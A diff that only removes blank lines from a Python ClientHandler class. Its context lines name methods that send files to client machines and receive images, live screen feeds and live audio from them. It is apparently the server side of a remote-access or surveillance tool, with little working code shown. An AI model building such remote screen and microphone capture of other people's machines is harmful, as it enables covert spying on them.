@@ -21,7 +21,6 @@ from IPython.display import clear_output
 class ClientHandler:
 
 
-
         # sends file from server to client machine
         def send_file(self, conn, usrFile):
             try:
@@ -48,7 +47,6 @@ class ClientHandler:
                                 file.close()
             except:
                 print("[-]Unable to send file!!!")
-
 
 
 
@@ -82,7 +80,6 @@ class ClientHandler:
 
 
 
-
         # receives images from the client machine
         def receive_client_image(self, client_folder, client_id, client_sock_object):
             try:
@@ -105,7 +102,6 @@ class ClientHandler:
             except Exception as e:
                 print("[-]Unable to receive image!!!")
                 # print(e)
-
 
 
 
@@ -158,7 +154,6 @@ class ClientHandler:
 
 
 
-
         # receives live screen feed from client, outputs recording live on screen and writes stream to client folder
         def live_screen_feed(self, conn):
             data = b""
@@ -206,8 +201,6 @@ class ClientHandler:
 
 
 
-
-        
         # receives live audio from client, outputs recording live and write stream to client folder
         def live_audio_feed(self, conn, client_folder, client_id):
             current_datetime = datetime.now()
@@ -282,4 +275,3 @@ class ClientHandler:
             wf.close()
             
             
-
